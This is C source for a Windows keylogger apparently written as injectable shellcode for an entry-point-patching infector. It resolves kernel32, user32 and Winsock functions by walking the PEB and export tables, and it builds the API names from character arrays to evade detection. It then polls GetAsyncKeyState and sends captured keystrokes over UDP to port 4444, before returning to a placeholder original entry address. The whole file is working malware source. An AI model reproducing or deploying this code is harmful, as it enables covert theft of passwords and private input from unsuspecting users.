#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <fileapi.h>
#include <stdbool.h>
#include <conio.h>
#include "shellcode_test.h"

#define ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER 0xBBBBBBBB
// Defines for keylogger.
#define MAX_MSG_LENGTH 1024
#define SYS_CALL_SUCCSSES 0
#define PORT_NUM 4444
#define MAX_MSG_LENGTH 1024
#define BUFFER_LENGTH 10
#define KEY_PRESSED_SINCE_LAST_CALL 0x0001

#define TO_LOWER(c){\
			if(c >= 'A' && c <= 'Z')\
				c -= 'A' - 'a';\
			}

__forceinline BOOL str_cmp(PWCHAR str1, PWCHAR str2)
{
	TO_LOWER(*str1);
	TO_LOWER(*str2);
	while (*str1 != 0 && *str2 != 0 && *str1 == *str2)
	{
		str1 += 1;
		str2 += 1;
		TO_LOWER(*str1);
		TO_LOWER(*str2);
	}
	if (*str1 == 0 && *str2 == 0)
		return TRUE;
	return FALSE;
}

__forceinline inline BOOL str_cmp2(PCHAR str1, PCHAR str2)
{
	char current_char_a = '0';
	char current_char_b = '0';
	do
	{
		current_char_a = *str1;
		current_char_b = *str2;
		TO_LOWER(current_char_a);
		TO_LOWER(current_char_b);
		str1 += 1;
		str2 += 1;
	} while (*str1 != 0 && *str2 != 0 && current_char_a == current_char_b);
	if (*str1 == 0 && *str2 == 0)
		return TRUE;
	return FALSE;
}

__forceinline LPVOID get_func_by_name(LPVOID dll, char* func_name)
{
	IMAGE_DOS_HEADER* dll_dos_header = (IMAGE_DOS_HEADER*)dll;
	if (dll_dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	IMAGE_NT_HEADERS* file_headers = (IMAGE_NT_HEADERS*)((BYTE*)dll + dll_dos_header->e_lfanew);
	IMAGE_DATA_DIRECTORY* export_directory = &(file_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	if (export_directory->VirtualAddress == NULL) {
		return NULL;
	}
	DWORD expAddr = export_directory->VirtualAddress;
	IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)dll);
	SIZE_T namesCount = exp->NumberOfNames;
	DWORD funcsListRVA = exp->AddressOfFunctions;
	DWORD funcNamesListRVA = exp->AddressOfNames;
	DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;
	//go through names:
	for (SIZE_T i = 0; i < namesCount; i++) {
		DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)dll + i * sizeof(DWORD));
		WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)dll + i * sizeof(WORD));
		DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)dll + (*nameIndex) * sizeof(DWORD));
		LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)dll);
		if (str_cmp2(func_name, curr_name))
			//found
			return (BYTE*)dll + (*funcRVA);
	}
	return NULL;
}

__forceinline LPVOID get_module_by_name(PWCHAR module_name)
{
	PPEB peb;
	peb = 0;
	_asm
	{
		mov eax, fs: [0x30]
		mov[peb], eax
	}
	PPEB_LDR_DATA ldr = peb->Ldr;
	LIST_ENTRY list = ldr->InLoadOrderModuleList;
	PLDR_DATA_TABLE_ENTRY Flink = *((PLDR_DATA_TABLE_ENTRY*)(&list));
	PLDR_DATA_TABLE_ENTRY curr_module = Flink;
	PWCHAR curr_name = NULL;
	while (curr_module != NULL && curr_module->BaseAddress != NULL) {
		if (curr_module->BaseDllName.Buffer == NULL) continue;
		curr_name = curr_module->BaseDllName.Buffer;
		if (str_cmp(curr_name, module_name))
			//found
			return curr_module->BaseAddress;
		// not found, try next:
		curr_module = (PLDR_DATA_TABLE_ENTRY)curr_module->InLoadOrderModuleList.Flink;
	}
	return NULL;
}

int main(VOID)
{
	WSADATA wsa = { 0 };
	SOCKET client_socket = NULL;
	struct sockaddr_in server_address = { 0 };
	char msg_buf[MAX_MSG_LENGTH] = { 0 };
	char ws_dll_name[] = { 'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
	char WSA_startup_name[] = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', 0 };
	char socket_function_name[] = { 's', 'o', 'c', 'k', 'e', 't', 0 };
	char getAsyncKeyState_name[] = { 'G', 'e', 't', 'A', 's', 'y', 'n', 'c', 'K', 'e', 'y', 'S', 't', 'a', 't', 'e', 0 };
	char htons_name[] = { 'h', 't', 'o', 'n', 's', 0 };
	char inet_addr_name[] = { 'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', 0 };
	char sendto_name[] = { 's', 'e', 'n', 'd', 't', 'o', 0 };
	char server_ip[] = { '1', '2', '7', '.', '0', '.', '0', '.', '1', 0 };

	char msg_box_content[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
	char user32_dll_name[] = { 'u', 's', 'e', 'r', '3','2','.','d','l','l', 0 };
	char load_library_name[] = { 'l', 'o', 'a', 'd', 'l', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
	char get_proc_address_name[] = { 'g', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
	WCHAR kernel32_dll_name[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
	HMODULE kernel32_dll = NULL;
	HMODULE user32_dll = NULL;
	HMODULE ws_dll = NULL;

	// Get kernel32.dll
	kernel32_dll = get_module_by_name(kernel32_dll_name);
	if (kernel32_dll == NULL)
		goto end;

	// Get load library function.
	HMODULE(WINAPI * M_loadLibraryA)(_In_opt_ LPCSTR lpLibFileName) =
		(HMODULE(WINAPI*)(_In_opt_ LPCSTR)) get_func_by_name(kernel32_dll, load_library_name);
	if (M_loadLibraryA == NULL)
		goto end;

	// Get getProcAddress's 
	FARPROC(WINAPI * M_getProcAddress)(_In_opt_ HMODULE hModule, _In_opt_ LPCSTR lProcName) =
		(FARPROC(WINAPI*)(_In_opt_ HMODULE, _In_opt_ LPCSTR)) get_func_by_name(kernel32_dll, get_proc_address_name);
	if (M_getProcAddress == NULL)
		goto end;

	// Get user32.dll
	user32_dll = M_loadLibraryA(user32_dll_name);
	if (user32_dll == NULL)
		goto end;

	// Get windows socket dll
	ws_dll = M_loadLibraryA(ws_dll_name);
	if (ws_dll == NULL)
		goto end;

	// Get M_WSAStartup function.
	int (WINAPI * M_WSAStartup)(WORD wVersionRequired, _Out_opt_ LPWSADATA lpWSAData) =
		(int (WINAPI*)(WORD, _Out_opt_ LPWSADATA)) M_getProcAddress(ws_dll, WSA_startup_name);
	if (M_WSAStartup == NULL)
		goto end;

	// Get socket function
	SOCKET(WSAAPI * M_socket)(_In_opt_ int af, _In_opt_ int type, _In_opt_ int protocol) =
		(SOCKET(WSAAPI*) (_In_opt_ int, _In_opt_ int, _In_opt_ int)) M_getProcAddress(ws_dll, socket_function_name);
	if (M_socket == NULL)
		goto end;

	// GetAsyncKeyState function.
	SHORT(WINAPI * M_GetAsyncKeyState)(_In_opt_ vKey) =
		(SHORT(WINAPI*)(_In_opt_)) M_getProcAddress(user32_dll, getAsyncKeyState_name);
	if (M_GetAsyncKeyState == NULL)
		goto end;

	// Get sendto function.
	int(WINAPI * M_sendto)(_In_opt_ SOCKET s, _In_opt_ const char* buf, _In_opt_ int len, _In_opt_ int flags
		, _In_opt_ const struct sockaddr* to, _In_opt_ int tolen) =
		(int(WINAPI*)(_In_opt_ SOCKET, _In_opt_ const char, _In_opt_ int, _In_opt_ int
			, _In_opt_ const struct sockaddr*, _In_opt_ int)) M_getProcAddress(ws_dll, sendto_name);
	if (M_sendto == NULL)
		goto end;


	// Get htons function.
	u_short(WINAPI * M_htons)(_In_opt_ u_short hostshort) =
		(u_short(WINAPI*)(_In_opt_ u_short)) M_getProcAddress(ws_dll, htons_name);
	if (M_htons == NULL)
		goto end;

	// Get inet_addr function.
	unsigned long(WINAPI * M_inet_addr)(_In_opt_ a) =
		(unsigned long(WINAPI*)(_In_opt_)) M_getProcAddress(ws_dll, inet_addr_name);
	if (M_inet_addr == NULL)
		goto end;

	// Start of keylogger.
	if (M_WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		goto end;
	}

	client_socket = M_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (client_socket == INVALID_SOCKET)
	{
		goto end;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_port = M_htons(PORT_NUM);
	server_address.sin_addr.S_un.S_addr = M_inet_addr(server_ip);
	int key_counter = 0;
	//start communication
	while (1)
	{
		for (int i = 8; i <= 190; i++) {
			if (M_GetAsyncKeyState(i) & KEY_PRESSED_SINCE_LAST_CALL)
			{
				msg_buf[key_counter] = i;
				key_counter++;
			}
		}

		if (key_counter < BUFFER_LENGTH)
			continue;

		//send the message
		if (M_sendto(client_socket, msg_buf, BUFFER_LENGTH, 0, (struct sockaddr*)&server_address, sizeof(server_address)) == SOCKET_ERROR)
		{
			goto end;
			// TODO: check what exit does.
			exit(EXIT_FAILURE);
		}

		// Reset buffer after sending message.
		key_counter = 0;
	}


end:
	_asm
	{
		mov eax, ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER
	}
}